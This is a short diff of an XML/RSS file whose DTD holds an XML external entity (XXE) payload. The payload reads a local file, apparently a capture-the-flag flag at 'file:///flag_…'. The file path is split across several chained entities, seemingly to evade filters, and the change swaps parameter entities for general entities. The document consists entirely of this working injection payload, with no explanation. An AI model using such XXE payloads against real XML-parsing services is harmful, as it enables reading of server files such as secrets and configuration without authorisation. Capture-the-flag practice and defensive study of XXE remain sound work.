@@ -2,11 +2,11 @@
 <!DOCTYPE anything
     [
         <!ELEMENT anything ANY >
-        <!ENTITY % earth "file:">
-        <!ENTITY % is "///fl">
-        <!ENTITY % flat "ag_66cc7da521fa97f7909f623cf11dcfd4">
-        <!ENTITY % PATH "%earth;%is;%flat;">
-        <!ENTITY xxe SYSTEM "%PATH;" >
+        <!ENTITY earth "file:">
+        <!ENTITY is "///fl">
+        <!ENTITY flat "ag_66cc7da521fa97f7909f623cf11dcfd4">
+        <!ENTITY PATH "&earth;&is;&flat;">
+        <!ENTITY xxe SYSTEM "&PATH;" >
     ]
 >
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
